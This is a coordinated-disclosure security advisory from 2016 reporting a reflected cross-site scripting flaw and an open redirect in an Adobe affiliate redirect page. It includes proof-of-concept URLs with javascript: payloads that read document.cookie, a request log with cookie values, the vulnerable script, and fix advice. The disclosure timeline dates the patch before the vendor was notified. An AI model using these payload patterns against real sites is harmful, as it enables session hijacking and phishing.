
Date: Fri, 19 Feb 2016 12:47:02 +0100
From: Vulnerability Lab <research@...nerability-lab.com>
To: bugtraq@...urityfocus.com, bugs@...uritytracker.com
Subject: Adobe - Multiple Client Side Cross Site Scripting Web Vulnerabilities

Document Title:
===============
Adobe - Multiple Client Side Cross Site Scripting Web Vulnerabilities


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1628

PSIRT ID: 4260 / 4261


Release Date:
=============
2016-02-15


Vulnerability Laboratory ID (VL-ID):
====================================
1628


Common Vulnerability Scoring System:
====================================
3


Product & Service Introduction:
===============================
Whether it is a smartphone or tablet app, a game, a video, a digital magazine, a website, or an online experience,
chances are that it was touched by Adobe technology. Our tools and services enable our customers to create
groundbreaking digital content, deploy it across media and devices, and then continually measure and optimize it
based on user data. By providing complete solutions that combine digital media creation with data-driven marketing,
we help businesses improve their communications, strengthen their brands, and ultimately achieve greater business success.

(Copy of the Vendor Homepage: http://www.adobe.com/aboutadobe/)


Abstract Advisory Information:
==============================
An independent vulnerability laboratory researcher discovered multiple client-side vulnerabilities in the official adobe online-service web-application.


Vulnerability Disclosure Timeline:
==================================
2015-10-29: Researcher Notification & Coordination (Daniel Díez Tainta - DaniLabs)
2015-10-30: Vendor Notification (Adobe PSIRT - Security Acknowledgements)
2015-11-03: Vendor Response/Feedback (Adobe PSIRT - Security Acknowledgements)
2015-02-03: Vendor Fix/Patch (Adobe - Developer Team)
2015-02-14: Security Reward (Adobe PSIRT - Security Acknowledgements)
2015-02-15: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
Adobe Systems
Product: Online Service - Web Application 2015 Q4


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
Multiple client-side web vulnerabilities has been discovered in the official Adobe (arvato) online service web-application. The first vulnerability 
is a Cross Site Scripting of type reflected. The second vulnerability is an open redirect is an application that takes a parameter and redirects an 
user to the parameter value without any validation.

The vulnerability is located in the `tduid` and `url` parameter values of the arvato_redirect.html file GET method request. The `tduid` parameter 
receives as argument `0`. The `url` parameter receives as argument an url or javascript code. Remote attackers are able to inject script codes 
to the client-side browser to application GET method requests. The attack vector of the issues are client-side and the request method to inject 
is GET. An attacker can send an url like http://www.vulnerability-lab.com and the request redirect to the external target url without approval.
An attacker can also send a javascript code like `javascript:alert(documen.cookie)` and the request executes without secure validation.

The security risk of the client-side web vulnerabilities are estimated as medium with a cvss (common vulnerability scoring system) count of 3.0.
Exploitation of the non-persistent web vulnerabilities requires no privileged web application user account and low or medium  user interaction. 
Successful exploitation of the vulnerability results in session hijacking, non-persistent phishing, non-persistent external redirects, 
non-persistent load of malicious script codes or non-persistent web module context manipulation.

Request Method(s):
				[+] GET

Vulnerable Module(s):
				[+] Adobe - arvato

Vulnerable File(s):
				[+] arvato_redirect.html

Vulnerable Parameter(s):
				[+] tduid
				[+] url


Proof of Concept (PoC):
=======================
The client-side vulnerabilities can be exploited by remote attackers without privileged web-application user account and with low or medium user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.

PoC: Cross Site Scripting
https://www.adobe.com/arvato_redirect.html?tduid=0&url=javascript:alert(document.domain)
https://www.adobe.com/arvato_redirect.html?tduid=0javascript:alert%28document.cookie%29&url=

PoC: Open Redirect
https://www.adobe.com/arvato_redirect.html?tduid=0&url=http://www.google.es


--- PoC Session Logs [GET] ---
Status: OK[200]
GET https://www.adobe.com/arvato_redirect.html?tduid=0&url=javascript:alert(document.cookie) 
Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Größe des Inhalts[unknown] Mime Type[unknown]
   Request Header:
      Host[www.adobe.com]
      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Accept-Language[de,en-US;q=0.7,en;q=0.3]
      Accept-Encoding[gzip, deflate]
      Cookie[dtLatC=56; dtPC=198644794_638h1; TRADEDOUBLER=0; mbox=session#1446198637998-786547#1446200498|PC#1446198637998-786547.26_19#1449222639; 
s_sq=%5B%5BB%5D%5D; s_vi=[CS]v1|2B199EBC05314EB1-6000011420006DAD[CE]; 
sfdc_session=-; s_sess=%20s_cc%3Dtrue%3B%20s_cpc%3D1%3B%20s_sq%3D%3B%20s_demandbase_v2.2%3Ddone%3B%20s_dmdbase%3D%255Bn%252Fa%255D%253A%255Bn%252Fa%2
55D%253A%255Bn%252Fa%255D%253A%255Bn%252Fa%255D%253A%255Bn%252Fa%255D%253A%255Bn%252Fa%255D%253AWireless%253AMobile%2520Network%3B%20s_
dmdbase_custom%3DFuldabr%25C3%25BCck%253A05%253A34277%253ADE%253A%255Bn%252Fa%255D%253A%255Bn%252Fa%255D%253A%255Bn%252Fa%255D%253A%255Bn%252Fa%255D%3B; 
s_pers=%20s_fid%3D014AEA34CF75A081-30D64128250EAD69%7C1509357038901%3B%20s_vs%3D1%7C1446200438903%3B%20gpv%3Dno%2520value%7C1446200438906%3B%20s
_nr%3D1446198638908-New%7C1477734638908%3B; s_cc=true; aam_uuid=88603075514468463170269453653802973821; 
dtCookie=87E42C5B5E16F929E67CA5354B350B54|QWRvYmUrZUNvbW1lcmNlfDE]


PoC: Source (Arvato Affiliate tracking  Redirect Page)

function setCookie(name, value, expires, path, domain, secure)
{
	console.log("Entering to set Cookie");
	var today = new Date();
	today.setTime( today.getTime() );
	if ( expires )
		{
		expires = expires * 1000 * 60 * 60 * 24;
		}
	var expires_date = new Date( today.getTime() + (expires) );
	console.log(expires_date);
	document.cookie= name + "=" + escape(value) +
	((expires) ? "; expires=" + expires_date.toGMTString() : "") +
	((path) ? "; path=" + path : "") +
	((domain) ? "; domain=" + domain : "") +
	((secure) ? "; secure" : "");
	console.log(document.cookie);
}
function getVar(name)
{
	get_string = document.location.search;
	return_value = '';
	do
		{
		name_index = get_string.indexOf(name + '=');
		if(name_index != -1)
			{
			get_string = get_string.substr(name_index + name.length + 1, get_string.length - name_index);
			end_of_value = get_string.indexOf('&');
			if(end_of_value != -1)
				{
				value = get_string.substr(0, end_of_value);
				}
			else
				{
				value = get_string;
				}
			if(return_value == '' || value == '')
				{
				return_value += value;
				}
			else
				{
				return_value += ', ' + value;
				}
			}
		}
	while(name_index != -1)
		{
		space = return_value.indexOf('+');
		}
	while(space != -1)
		{
		return_value = return_value.substr(0, space) + ' ' + return_value.substr(space + 1, return_value.length);
		space = return_value.indexOf('+');
		}
	return(return_value);
}
function redirTo()
{
	var strReturn = "";
	var strHref = document.location.href;
	if ( strHref.indexOf("&url=") > -1 )
		{
		strReturn = strHref.substr(strHref.indexOf("&url=")+5);
		}
	else
		{
		strReturn = "http://www.adobe.com";
		}
	return strReturn;
}
var mytduid = getVar('tduid');
console.log("TDUID : "+mytduid);
setCookie('TRADEDOUBLER', mytduid, 365,"/",".adobe.com",true);
window.location = redirTo();



Reference(s):
https://www.adobe.com/arvato_redirect.html


Solution - Fix & Patch:
=======================
The open vulnerability can be patched by a restriction of the requested parameters in the url value. Disallow special chars and use a whitelist to deny external redirects.

The client-side cross site scripting vulnerability can be patched by a secure parse and encode of the vulnerable tduid value in the arvato_redirect.html file.
Disallow special chars and filter the input to correct the context to prevent further client-side javascript code injection attacks against the web-application.


Security Risk:
==============
The security risk of the client-side cross site scripting web vulnerability in the adobe web-application is estimated as medium. (CVSS 3.0)
The security risk of the client-side open redirect web vulnerability in the adobe web-application is estimated as low. (CVSS 2.1)


Credits & Authors:
==================
Daniel Díez Tainta - (@DaniLabs)


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
policies, deface websites, hack into databases or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
Contact:    admin@...nerability-lab.com 	- research@...nerability-lab.com 	       		- admin@...lution-sec.com
Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
(admin@...nerability-lab.com or research@...nerability-lab.com) to get a permission.

				Copyright © 2016 | Vulnerability Laboratory - [Evolution Security GmbH]™

-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com
CONTACT: research@...nerability-lab.com


